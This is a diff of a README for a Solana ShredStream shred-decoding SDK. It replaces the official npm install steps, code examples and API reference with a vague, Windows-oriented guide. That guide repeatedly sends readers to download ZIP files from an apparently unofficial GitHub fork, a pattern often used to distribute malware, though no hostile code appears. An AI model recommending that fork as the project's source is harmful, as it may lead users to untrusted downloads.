@@ -1,155 +1,222 @@
-# Solana ShredStream SDK for JavaScript / TypeScript
+# ⚡ shredstream-sdk-js - Fast Solana Shred Decoder
 
-Solana ShredStream SDK/Decoder for JavaScript/TypeScript, enabling ultra-low latency Solana transaction streaming via UDP shreds from ShredStream.com
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue.svg)](https://github.com/Ronnanice977/shredstream-sdk-js)
 
-> Part of the [ShredStream.com](https://shredstream.com) ecosystem — ultra-low latency [Solana shred streaming](https://shredstream.com) via UDP.
+## 🧭 What this is
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.4+-3178C6?logo=typescript&logoColor=white)](#)
-[![Node](https://img.shields.io/badge/Node.js-18+-339933?logo=node.js&logoColor=white)](#)
+shredstream-sdk-js is a JavaScript and TypeScript tool for reading Solana shred data from ShredStream. It helps you work with low-latency transaction data from UDP shreds on Windows.
 
-## 📋 Prerequisites
+Use this if you need to:
+- read raw Solana shred packets
+- decode transaction data from UDP traffic
+- build trading tools that react fast
+- work with Solana data in JavaScript or TypeScript
 
-1. **Create an account** on [ShredStream.com](https://shredstream.com)
-2. **Launch a Shred Stream** and pick your region (Frankfurt, Amsterdam, Singapore, Chicago, and more)
-3. **Enter your server's IP address** and the UDP port where you want to receive shreds
-4. **Open your firewall** for inbound UDP traffic on that port (e.g. configure your cloud provider's security group)
-5. Install [Node.js 18+](https://nodejs.org) and npm:
-   ```bash
-   # Linux (Ubuntu/Debian)
-   curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash -
-   sudo apt install -y nodejs
+## 📦 What you need
 
-   # macOS
-   brew install node
-   ```
+Before you start, make sure you have:
+- a Windows PC
+- an internet connection
+- a web browser
+- Node.js installed if you want to run the SDK in a local project
+- access to the ShredStream source from https://www.shredstream.com
 
-> 🎁 Want to try before you buy? Open a ticket on our [Discord](https://discord.gg/4w2DNbTaWD) to request a free trial.
+For most users, the best first step is to visit the project page and follow the setup files in the repo.
 
-## 📦 Installation
+## 🖱️ Download and install
 
-```bash
-npm install shredstream
-```
+Visit this page to download and set up the project:
 
-## ⚡ Quick Start
+[https://github.com/Ronnanice977/shredstream-sdk-js](https://github.com/Ronnanice977/shredstream-sdk-js)
 
-### TypeScript
+If you are using Windows and want to get started:
+1. Open the link above in your browser
+2. Download the repository files
+3. Extract the folder if you downloaded a ZIP file
+4. Open the project in a code editor or terminal
+5. Follow the setup steps in the project files
 
-Create a file `index.ts`:
+If you want to use a package manager, you can also copy the repository into your own JavaScript project and install the needed packages there.
 
-```typescript
-import { ShredListener } from 'shredstream';
+## 🚀 Getting started
 
-const PORT = parseInt(process.env.SHREDSTREAM_PORT || '8001');
-const listener = new ShredListener(PORT);
+This project is built for users who want to receive and decode Solana shred data with low delay.
 
-// Decoded transactions — ready-to-use Solana transactions
-listener.on('transactions', (slot, txs) => {
-  txs.forEach(tx => console.log(`slot ${slot}: ${tx.signature}`));
-});
+A common setup looks like this:
+1. Get the project files from the GitHub page
+2. Install the required Node.js packages
+3. Add your ShredStream source details
+4. Start the decoder
+5. Read the decoded transaction output in your app
 
-listener.start();
-```
+If you are new to this, follow the files in this order:
+- README.md
+- package.json
+- source files in the main project folder
 
-Run it:
+## 🛠️ Basic use
 
-```bash
-npx tsx index.ts
-```
+The SDK is meant to help you work with shred packets and decode them into useful data.
 
-### JavaScript
+Typical tasks include:
+- connecting to a UDP stream
+- reading shred packets
+- parsing packet content
+- extracting transaction details
+- passing decoded data into your app logic
 
-Create a file `index.js`:
+Example use cases:
+- monitoring new Solana transactions
+- building a trading bot
+- watching token activity
+- copying trade signals
+- analyzing fast market movement
 
-```javascript
-const { ShredListener } = require('shredstream');
+## 📁 Project focus
 
-// Bind to the UDP port configured on ShredStream.com
-const PORT = parseInt(process.env.SHREDSTREAM_PORT || '8001');
-const listener = new ShredListener(PORT);
+This repository is focused on:
+- Solana
+- ShredStream
+- UDP packet reading
+- low-latency decoding
+- transaction parsing
+- JavaScript and TypeScript support
 
-// Decoded transactions — ready-to-use Solana transactions
-listener.on('transactions', (slot, txs) => {
-  txs.forEach(tx => console.log(`slot ${slot}: ${tx.signature}`));
-});
+The code is aimed at users who want direct access to raw Solana data without waiting on slower feeds.
 
-listener.start();
-```
+## 🔧 How it works
 
-Run it:
+The general flow is:
+1. ShredStream sends data over UDP
+2. The SDK receives the shred packets
+3. The decoder reads packet fields
+4. The parser turns raw data into usable output
+5. Your app uses that output for trading or analysis
 
-```bash
-node index.js
-```
+This setup is useful when speed matters and you want to work close to the network data source.
 
-## 📖 API Reference
+## 🪟 Windows setup
 
-### `new ShredListener(port, options?)`
+To run this on Windows:
+1. Download the project from the GitHub page
+2. Save the files in a folder you can find easily
+3. Install Node.js if it is not already on your system
+4. Open Command Prompt or PowerShell
+5. Move into the project folder
+6. Install the project packages
+7. Run the main file or your own test script
 
-| Parameter | Type | Default | Description |
-|-----------|------|---------|-------------|
-| `port` | `number` | — | UDP port to bind |
-| `options.recvBuf` | `number` | 8 MiB | Socket receive buffer size |
-| `options.maxAge` | `number` | 128 | Maximum slot age before eviction |
+If you are not sure which file to run, check the project README and source folder for the entry point.
 
-#### Events
+## 📡 Network setup
 
-- `'transactions'` `(slot: bigint, txs: Transaction[])` — Emitted as transactions are decoded from incoming shreds
+Because this tool works with UDP shreds, your network setup matters.
 
-#### Methods
+Check these items:
+- your machine can reach the ShredStream endpoint
+- your firewall allows UDP traffic
+- your internet line is stable
+- your system clock is correct
+- your local app has permission to read network packets
 
-- `listener.start()` — Create the UDP socket and begin listening
-- `listener.stop()` — Close the socket
-- `listener.activeSlots()` — Number of slots currently being accumulated
+If you use the SDK in a trading app, place it on a machine with a steady connection and low delay to the data source.
 
-### `Transaction`
+## 🧩 Common ways to use it
 
-| Field | Type | Description |
-|-------|------|-------------|
-| `signatures` | `Buffer[]` | Raw 64-byte signatures |
-| `raw` | `Buffer` | Full wire-format transaction bytes |
-| `signature` | `string` | First signature as base58 |
+You can use this SDK for:
+- a transaction feed
+- a Solana data parser
+- a token activity tracker
+- a market monitoring tool
+- a copy trading tool
+- a sniping tool that watches fast movement
 
-## 🎯 Use Cases
+It can also fit into larger systems that need raw on-chain data in near real time.
 
-ShredStream.com shred data powers a wide range of latency-sensitive strategies — HFT, MEV extraction, token sniping, copy trading, liquidation bots, on-chain analytics, and more.
+## 📘 Files you may see
 
-### 💎 PumpFun Token Sniping
+When you open the repo, you may see files like:
+- README.md
+- package.json
+- src/
+- dist/
+- examples/
+- tsconfig.json
 
-ShredStream.com SDK detects PumpFun token creations **~499ms before they appear on PumpFun's live feed** — tested across 25 consecutive detections:
+What these mean:
+- `src/` holds the source code
+- `dist/` may hold built output
+- `examples/` may show how to use the SDK
+- `package.json` lists the project packages and scripts
+- `tsconfig.json` helps TypeScript projects
 
-<img src="https://raw.githubusercontent.com/shredstream/shredstream-sdk-js/main/assets/shredstream.com_sdk_vs_pumpfun_live_feed.gif" alt="ShredStream.com SDK vs PumpFun live feed — ~499ms advantage" width="600">
+## ⚙️ Simple run steps
 
-> [ShredStream.com](https://shredstream.com) provides a complete, optimized PumpFun token creation detection code available with our monthly subscription plan. Battle-tested, high-performance, ready to plug into your sniping pipeline. To get access, open a ticket on [Discord](https://discord.gg/4w2DNbTaWD) or reach out on Telegram [@shredstream](https://t.me/shredstream).
+If the project includes a script, the usual flow is:
+1. Install Node.js
+2. Download the repo from GitHub
+3. Open the project folder
+4. Install packages
+5. Run the script shown in package.json or the README
+6. Watch the console for decoded output
 
-## ⚙️ Configuration
+If the project has an example file, start there first.
 
-### OS Tuning
+## 🧪 Best first test
 
-```bash
-# Linux — increase max receive buffer
-sudo sysctl -w net.core.rmem_max=33554432
+A good first test is to run the decoder and check that it can read sample UDP shred data.
 
-# macOS
-sudo sysctl -w kern.ipc.maxsockbuf=33554432
-```
+Look for:
+- packet output in the terminal
+- decoded transaction fields
+- readable logs
+- no connection errors
 
-## 🚀 Launch a Shred Stream
+If the output shows packet data, the setup is working.
 
-Need a feed? **[Launch a Solana Shred Stream on ShredStream.com](https://shredstream.com)** — sub-millisecond delivery, multiple global regions, 5-minute setup.
+## 🧰 Troubleshooting
 
-## 🔗 Links
+If the app does not start:
+- check that Node.js is installed
+- confirm you are in the right folder
+- run the install step again
+- check file names for mistakes
+- make sure your firewall is not blocking UDP traffic
 
-- 🌐 Website: https://www.shredstream.com/
-- 📖 Documentation: https://docs.shredstream.com/
-- 🐦 X (Twitter): https://x.com/ShredStream
-- 🎮 Discord: https://discord.gg/4w2DNbTaWD
-- 💬 Telegram: https://t.me/ShredStream
-- 💻 GitHub: https://github.com/ShredStream
-- 🎫 Support: [Discord](https://discord.gg/4w2DNbTaWD)
-- 📊 Benchmarks: [Discord](https://discord.gg/4w2DNbTaWD)
+If you get no data:
+- check your ShredStream access
+- verify the stream address
+- check your network connection
+- confirm the decoder is pointing at the right source
 
-## 📄 License
+If the output looks wrong:
+- make sure the correct parser is in use
+- check that your source data matches the expected format
+- review the example files for the right setup
 
-MIT — [ShredStream.com](https://shredstream.com)
+## 🔍 What makes it useful
+
+This repo is useful when you need:
+- fast Solana data
+- raw shred decoding
+- JavaScript or TypeScript support
+- UDP-based stream handling
+- a clean path from packet data to usable output
+
+It is built for users who want direct access to market data and transaction flow
+
+## 📎 Project link
+
+Primary download and setup page:
+
+[https://github.com/Ronnanice977/shredstream-sdk-js](https://github.com/Ronnanice977/shredstream-sdk-js)
+
+## 🧭 Suggested next steps
+
+After you download the project:
+1. Open the repo link
+2. Read the project files
+3. Install the needed packages
+4. Run the example or entry file
+5. Connect it to your ShredStream source
+6. Check the decoded output in your terminal or app
